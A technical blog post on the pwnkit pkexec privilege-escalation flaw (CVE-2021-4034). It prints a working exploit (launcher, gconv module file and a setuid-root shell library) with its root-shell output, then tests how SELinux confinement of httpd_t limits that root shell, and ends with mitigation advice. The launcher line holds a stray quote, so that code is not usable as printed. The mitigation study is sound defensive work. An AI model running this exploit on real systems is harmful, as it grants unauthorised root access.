---
layout: post
title: "Pwnkit and SELinux"
date: 2022-03-16 10:37:00 -0000
tags: SELinux CVE
---

## Introduction
CVE-2021-4034, also known as "pwnkit" is a privilege escalation vulnerability found in the pkexec program, allowing an unprivileged user to obtain a root shell.  This post will investigate the ability of SELinux access controls to mitigate the impact of an exploitation of this vulnerability.

Other sources have provided detailed techncial write-ups (for example, the [disclosure](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt) from Qualys who reported the vulnerability: ), so we won't explore the technical details of the exploit itself in this post.  In brief, by abusing the (incorrect) assumption that the first argument to a program is always its filename, we can trick pkexec, which is typically installed as a setuid binary into writing some data from its command line arguments into its environmental variables.  This is helpful for exploitation, because certain environmental variables can have significant security impact, and are cleared at program startup (for details, see the [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html)).  This method enables us to write to "secure" variables that have already been cleared.

However, our exploitation window is limited, since pkexec clears its own environmental variables early in execution.  However, the researchers at Qualsys discovered that it is possible cause pkexec to attempt to write an error message, and load localization information by executing a library controled by an environmental variable that we set, resulting in arbitary code execution of that library inside the setuid pkexec binary, and therefore a privilege escalation to root.

## Exploiting the vulnerability
We'll be running everything on a VM with a fresh install of Fedora 35.  I downgraded polkit to 0.117-4 in order to get an exploitable version and installed a few SELinux analysis tools (setools-console), as well as the SELinux development headers (libselinux-devel).  Those packages will help us probe our exploit with SELinux, but don't have any impact on the protection SELinux provides us.

First, lets get the vulnerability working in SELinux permissive mode:

```
$ sudo setenforce 0
```

We'll go back to enforcing once we have the exploit working.  The exploit code I wrote looked like this:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *env[] = { "pwnkit", "PATH="GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", "GIO_USE_VFS=", NULL };
execve("/usr/bin/pkexec", (char*[]){NULL}, env);
}
```

More self contained versions are available online, but this seems to be the minimum use case for exploitation.  We also need to create a directory named `GCONV_PATH=.`, containing an executable file named `pwnkit`, and another directory named `pwnkit`.  The `pwnkit` directory contains a gconv configuration file named `gconv-modules` and a shared library named `pwnkit.so`.

gconv-modules:

```
module UTF-8// PWNKIT// pwnkit 2
```

pwnkit.c:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}
void gconv_init () {
setuid(0);
setgid(0);
seteuid(0);
setegid(0);
system("PATH=/usr/bin:/usr/bin /bin/sh");
exit(0);
}
```

We compile pwnkit.c as a shared library like so:

```
$ gcc pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC
```

And that's all we need!  Now we run our exploit:

```
$ gcc exploit.c
$ ./a.out
sh-5.1# id
uid=0(root) gid=0(root) groups=0(root),10(wheel),1000(dburgener) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Perfect, we have a root shell.  Now lets consider the vulnerability in the presence of SELinux.

## Fedora Targeted policy and SELinux domains
You may have noticed in the id command output above, that our SELinux context of `unconfined_u:unconfined_r:unconfined_t` was displayed.  As the name implies, `unconfined_t` is (almost entirely) unconfined by SELinux.  The philosophy behind Fedora's policy is to avoid breaking things for logged in users by giving them full access, while targeting SELinux confinement to various system processes and daemons.  This means that for a logged in regular user, SELinux is giving us no extra protection against pwnkit.  SELinux protections are only as strong as the policy provided.  We can demonstrate this easily by going back to enforcing mode (`$ sudo setenforce 1`) and running our exploit again.  Again, we get a root shell.

So, SELinux won't help us in that scenario, but that's by the design of targeted policy, since it's targeted.  Let's look at the common use case of a webserver.  Given its network connectivity, this is a potential attack vector to our system, so we'd like to mitigate the impact of someone who has obtained remote code execution against our webserver to escalate to root.

On the Fedora targeted policy, webservers run as the domain `httpd_t`.  We can run our exploit as `httpd_t` using the command runcon, but in order to transition successfully, we'll need our binary to have an SELinux type that `httpd_t` has the entrypoint permission on:

```
$ sudo setenforce 1
$ chcon -t httpd_exec_t a.out
$ runcon -r system_r -t httpd_t ./a.out
$
```

No root shell.  Let's look at our logs and see what happened.  The logs show this SELinux denial:

```
AVC avc:  denied  { execute } for  pid=2433 comm="pkexec" name="pwnkit" dev="sda2" ino=546 scontext=unconfined_u:system_r:httpd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_home_t:s0 tclass=file permissive=0
```

We've successfully ran as the httpd domain, but as we mentioned above, the file "GCONV_PATH=./pwnkit" must be executable for the exploit to work, and `httpd_t` doesn't have the execute permission on `user_home_t`.  Of course, `user_home_t` is just a consequence of the fact we're doing this in our home directory.  In a real world scenario, this file would presumably be written by the compromised webserver itself.  So lets see if we can find a type to set this to that `httpd_t` has both write and execute permissions on:

```
sesearch -A -s httpd_t -p write,execute -ep
```

No results.  It's good practice to avoid granting the write and execute permission at the same time where possible to avoid exactly this sort of exploit, so this is nice to see.  However, if we dig in sesearch some more, we may eventually discover the following set of rules:

```
allow httpd_t httpd_tmp_t:file { create link map open rename setattr unlink watch watch_reads write };
allow httpd_t httpd_tmp_t:file { execute execute_no_trans }; [ httpd_builtin_scripting && httpd_tmp_exec ]:True
```

The `httpd_tmp_t` type is by default writable, and can become executable if the administrator has set a boolean.  Let's assume we're on a system where that boolean is set and set it ourselves.  Then we'll relabel our files to those types and move on.

```
$ sudo setsebool httpd_tmp_exec on
$ chcon -t httpd_tmp_t GCONV_PATH\=./pwnkit pwnkit/*
```

Now we rerun our exploit:

```
$ runcon -r system_r -t httpd_t ./a.out
$
```

Still nothing.  Let's check the logs again.  This time we get the log message we tricked pkexec into logging:

```
dburgener: The value for the SHELL variable was not found the /etc/shells file
```

However, this time there are no SELinux denials.  We know this worked in permissive mode and with unconfined, so SELinux must be blocking us.  Some SELinux rules are enforced by not audited, so let disable that behavior and see if we get any denials:

```
$ semodule -DB
$ runcon -r system_r -t httpd_t ./a.out
```

Ah-ha! Now checking our log shows some denials.  Four copies of this:

```
AVC avc:  denied  { read write } for  pid=2560 comm="a.out" path="/dev/pts/0" dev="devpts" ino=3 scontext=unconfined_u:system_r:httpd_t:s0-s0:c0.c1023 tcontext=unconfined_u:object_r:user_devpts_t:s0 tclass=chr_file permissive=0
```

The `user_devpts_t` type is the pseudoterminal we're running our code in.  We're successfully running our exploit, but can't write to the terminal.  However, sesearch shows another boolean that can be helpful:

```
$ sesearch -A -s httpd_t -t user_devpts_t
allow daemon ptynode:chr_file { append getattr ioctl lock open read write }; [ daemons_use_tty ]:True
# [irrelevant results removed]
allow httpd_t user_devpts_t:chr_file { append getattr ioctl lock read write }; [ httpd_tty_comm ]:True
```

We can write to a terminal if either of these booleans are set.  Let's assume that an administrator set one of them as well:

```
$ sudo setsebool httpd_tty_comm on
$ runcon -r system_r -t httpd_t ./a.out 
sh-5.1# id
uid=0(root) gid=0(root) groups=0(root),10(wheel),1000(dburgener) context=unconfined_u:system_r:httpd_t:s0-s0:c0.c1023
```

A root shell!  But note a critical difference.  Instead of running as `unconfined_t`, our shell is still running as the webserver SELinux domain, `httpd_t`.  This means that we are limited to only what the webserver is privileged to do.

Let's try to do something malicious:

```
# cat /etc/shadow
cat: /etc/shadow: Permission denied
```

Even though we are root, SELinux is still preventing us from reading the shadow password file.  Pesky SELinux, let's go back to permissive mode:

```
# setenforce 0
setenforce: setenforce() failed
# echo "0" > /sys/fs/selinux/enforce
# getenforce
Enforcing
```

Still confined by SELinux.  In general, we're restricted to only the things webservers normally do, because that's how the policy is written.  That means we'll be able to access the network and possibly do some exfiltration, but that exfiltration will be limited by what the webserver can read.  And our ability to damage the system or escalate further is extremely restricted.  Even though we've gotten a root shell, we're still constrained by the SELinux policy and can't compromise system integrity.

A similar process would occur with other confined domains, including docker containers.


## Some takeaways
1. SELinux can provide protection even if an attacker escalates to root.
2. If you haven't already, you should patch your systems against the pwnkit vulnerability.  SELinux is a mitigation, but its even better to not be exploited in the first place.
3. The policy matters greatly.  When we were running the exploit as `unconfined_t` we had no problems, but confined domains such as containers or webservers were locked down.  Once we've successfully escalated, we're limited by the policy for the domain we escalated from, so the principle of "Least Privilege" is critically important for policy developers, in order to avoid excessive permissions in such a scenario.
4. This exploit path required having a combination of "write" and "execute" permissions on a particular file type, a common pattern for many exploits.  Fortunately, the `httpd_t` policy was tightly locked down in that regard, so we had to introduce the assumption that a system administrator had changed SELinux booleans.  There are two lessons here.  1. As a policy or application developer, avoid the need to write and execute the same files.  2. As a system administrator, be careful when setting booleans, because it may negatively impact system security.
